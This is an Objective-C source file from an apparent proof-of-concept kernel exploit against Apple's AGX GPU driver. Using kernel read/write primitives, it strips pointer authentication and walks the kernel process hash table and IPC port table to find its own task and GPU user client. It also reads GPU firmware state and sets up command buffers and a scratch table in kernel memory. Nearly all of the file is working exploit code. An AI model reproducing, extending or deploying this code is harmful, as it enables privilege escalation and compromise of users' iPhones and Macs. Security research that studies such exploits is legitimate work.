#import <Foundation/Foundation.h>
#import <Metal/Metal.h>

#include "poc.h"
#include "gfx.h"
#include "IOGPUDevice.h"
#include "offsets.h"
#include "target.h"

#include <libkextrw.h>
#include <mach/mach.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

struct PocContext gPoc = {0};

static id<MTLDevice> gMetal;

static uint64_t strip_pac(uint64_t pointer)
{
    __asm__ volatile("xpacd %0" : "+r"(pointer));
    return pointer;
}

static uint64_t kptr(uint64_t address)
{
    if (address < 0xfffffe0000000000ULL ||
        address >= 0xfffffff000000000ULL || (address & 7) != 0) return 0;
    return strip_pac(kread64(address));
}

static bool is_kptr(uint64_t pointer)
{
    return pointer >= 0xfffffe0000000000ULL &&
        pointer < 0xfffffff000000000ULL && (pointer & 7) == 0;
}

static bool is_gfx_address(uint64_t address)
{
    return (address & 0xffffff0000000000ULL) ==
        0xfffffc0000000000ULL;
}

static uint32_t pid_hash(uint32_t pid)
{
    uint32_t hash = pid ^ (pid >> 16);
    hash *= 0x7feb352dU;
    hash ^= hash >> 15;
    hash *= 0x846ca68bU;
    return hash ^ (hash >> 16);
}

static uint64_t find_self_proc(void)
{
    uint64_t packed = kread64(kslide(gTarget->proc_hash_table));
    unsigned shift = (unsigned)((packed >> 48) & 0xff);
    if (shift >= 64) return 0;

    uint64_t mask = UINT64_MAX >> shift;
    uint64_t table = packed | 0x00ff000000000000ULL;
    uint64_t bucket = table + sizeof(uint64_t) *
        (pid_hash((uint32_t)getpid()) & mask);
    uint64_t link = kptr(bucket);

    for (unsigned i = 0; i < 64 && is_kptr(link); i++) {
        uint64_t proc = link - PROC_HASH_LINK;
        if (kread32(proc + PROC_PID) == (uint32_t)getpid()) return proc;
        uint64_t next = kptr(link);
        if (next == link) break;
        link = next;
    }
    return 0;
}

static bool find_self(uint64_t *task, uint64_t *ipc_space)
{
    uint64_t proc = find_self_proc();
    if (!is_kptr(proc)) return false;

    uint64_t proc_ro = kptr(proc + PROC_RO);
    uint64_t found_task = is_kptr(proc_ro) ?
        kptr(proc_ro + PROC_RO_TASK) : 0;
    uint64_t found_space = is_kptr(found_task) ?
        kptr(found_task + TASK_IPC_SPACE) : 0;
    if (!is_kptr(found_space) ||
        kptr(found_space + IPC_SPACE_TASK) != found_task) {
        return false;
    }
    *task = found_task;
    *ipc_space = found_space;
    return true;
}

static uint64_t ipc_table(uint64_t ipc_space, uint64_t *size)
{
    uint64_t encoded = strip_pac(kread64(ipc_space + IPC_SPACE_TABLE));
    uint64_t table;

    if (encoded & 0x400000000000ULL) {
        *size = ((encoded & 0x10ULL) | 0x20ULL) << (encoded & 0xfULL);
        table = encoded & 0xffffffffffffffe0ULL;
    } else {
        *size = (encoded & 0x3fffULL) << 14;
        table = (encoded & 0xffffffffffffc000ULL) |
            0x400000000000ULL;
    }
    return is_kptr(table) ? table : 0;
}

static bool find_agx_client(uint64_t task, uint64_t ipc_space)
{
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t name_count = 0;
    mach_msg_type_number_t type_count = 0;
    uint64_t table_size = 0;
    uint64_t table = ipc_table(ipc_space, &table_size);

    if (!table || mach_port_names(mach_task_self(), &names, &name_count,
                                  &types, &type_count) != KERN_SUCCESS ||
        name_count != type_count) {
        return false;
    }

    bool found = false;
    for (mach_msg_type_number_t i = 0; i < name_count; i++) {
        uint64_t index = (uint64_t)names[i] >> 8;
        if (!(types[i] & MACH_PORT_TYPE_SEND) ||
            index >= table_size / IPC_ENTRY_SIZE) continue;

        uint64_t port = strip_pac(kread64(
            table + index * IPC_ENTRY_SIZE));
        uint32_t bits = is_kptr(port) ? kread32(port + IPC_PORT_BITS) : 0;
        uint64_t wrapper = (bits & 0xff) == 39 ?
            kptr(port + IPC_PORT_KOBJECT) : 0;
        uint64_t client = is_kptr(wrapper) &&
            kptr(wrapper) == kslide(gTarget->iomachport_vtable) ?
            kptr(wrapper + IOMACHPORT_OBJECT) : 0;
        uint64_t device = is_kptr(client) &&
            kptr(client) == kslide(gTarget->agx_userclient_vtable) ?
            kptr(client + USERCLIENT_DEVICE) : 0;

        if (!is_kptr(device) || kptr(device + DEVICE_MACH_TASK) != task ||
            kread32(device + DEVICE_PID) != (uint32_t)getpid()) continue;

        gPoc.connection = names[i];
        gPoc.device = device;
        gPoc.gpu_task = kptr(device + DEVICE_IOGPU_TASK);
        gPoc.namespace_address = kptr(device + DEVICE_NAMESPACE);
        found = is_kptr(gPoc.gpu_task) &&
            is_kptr(gPoc.namespace_address);
        if (found) break;
    }

    vm_deallocate(mach_task_self(), (vm_address_t)names,
                  name_count * sizeof(*names));
    vm_deallocate(mach_task_self(), (vm_address_t)types,
                  type_count * sizeof(*types));
    return found;
}

static bool read_drop_state(void)
{
    gPoc.iogpu = kptr(gPoc.device + DEVICE_IOGPU);
    uint64_t drop = is_kptr(gPoc.iogpu) ?
        kptr(gPoc.iogpu + gTarget->drop_state) : 0;
    uint64_t owner = is_kptr(drop) ?
        kptr(drop + gTarget->drop_owner) : 0;
    gPoc.drop_map = is_kptr(owner) ? kptr(owner + OWNER_BUFFER) : 0;
    if (!is_kptr(gPoc.drop_map)) return false;

    uint64_t gfx_base = kread64(gPoc.drop_map + MAP_GPU_BASE);
    gPoc.firmware_task = kptr(gPoc.drop_map + MAP_TASK);
    gPoc.gpu_offset = kread32(drop + gTarget->drop_gpu_offset);
    gPoc.command_argument_size =
        kread32(gPoc.iogpu + COMMAND_ARGUMENT_SIZE);
    gPoc.new_queue_argument_size =
        kread32(gPoc.iogpu + NEW_QUEUE_ARGUMENT_SIZE);

    return is_gfx_address(gfx_base) &&
        is_kptr(gPoc.firmware_task) &&
        gPoc.gpu_offset <= PAGE_SIZE_16K - 8 &&
        kread64(gPoc.device + DEVICE_MDSID_MAP) == 0 &&
        kread32(gPoc.iogpu + gTarget->dsids_supported) != 0 &&
        gPoc.command_argument_size >= 8 &&
        gPoc.command_argument_size <= PAGE_SIZE_16K &&
        gPoc.new_queue_argument_size >= 0x408 &&
        gPoc.new_queue_argument_size <= PAGE_SIZE_16K;
}

static int poc_init_common(bool neo_only)
{
    if (target_init(neo_only) != 0) {
        fputs("setup    failure=target\n", stderr);
        return -1;
    }

    gMetal = MTLCreateSystemDefaultDevice();
    uint64_t task = 0;
    uint64_t ipc_space = 0;
    if (!gMetal) {
        fputs("setup    failure=metal\n", stderr);
        return -1;
    }
    if (!find_self(&task, &ipc_space)) {
        fputs("setup    failure=self\n", stderr);
        return -1;
    }
    gPoc.task = task;
    gPoc.ipc_space = ipc_space;
    if (!find_agx_client(task, ipc_space)) {
        fputs("setup    failure=client\n", stderr);
        return -1;
    }
    if (!read_drop_state()) {
        fputs("setup    failure=drop\n", stderr);
        return -1;
    }
    if (IOGPU_setup_command_buffers() != 0) {
        fputs("setup    failure=queues\n", stderr);
        return -1;
    }
    if (IOGPU_setup_mdsid_table() != 0) {
        fputs("setup    failure=scratch\n", stderr);
        return -1;
    }
    printf("path     scratch=0x%016llx allocator=agx-shared "
           "kcall=0 physrw=0\n",
           gPoc.mdsid_table);
    return 0;
}

int poc_init(void)
{
    return poc_init_common(false);
}

int poc_init_neo(void)
{
    return poc_init_common(true);
}

int poc_init_client(void)
{
    if (target_init(true) != 0) {
        fputs("setup    failure=target\n", stderr);
        return -1;
    }

    uint64_t task = 0;
    uint64_t ipc_space = 0;
    if (!find_self(&task, &ipc_space)) {
        fputs("setup    failure=self\n", stderr);
        return -1;
    }
    gPoc.task = task;
    gPoc.ipc_space = ipc_space;
    if (!find_agx_client(task, ipc_space)) {
        fputs("setup    failure=client\n", stderr);
        return -1;
    }
    return 0;
}

void poc_deinit(void)
{
    if (gPoc.marker_dirty && is_kptr(gPoc.marker_cpu_address)) {
        uint64_t observed = 0;
        bool restored = kwritebuf(gPoc.marker_cpu_address,
                                  &gPoc.marker_saved,
                                  sizeof(gPoc.marker_saved)) ==
                KERN_SUCCESS &&
            kreadbuf(gPoc.marker_cpu_address, &observed,
                     sizeof(observed)) == KERN_SUCCESS &&
            observed == gPoc.marker_saved;
        fprintf(stderr, "cleanup  marker_fallback=%u\n",
                restored ? 1U : 0U);
    }
    if (is_kptr(gPoc.mdsid_table)) {
        (void)kwritebuf(gPoc.mdsid_table, gPoc.mdsid_table_saved,
                        sizeof(gPoc.mdsid_table_saved));
    }
    gMetal = nil;
    memset(&gPoc, 0, sizeof(gPoc));
}
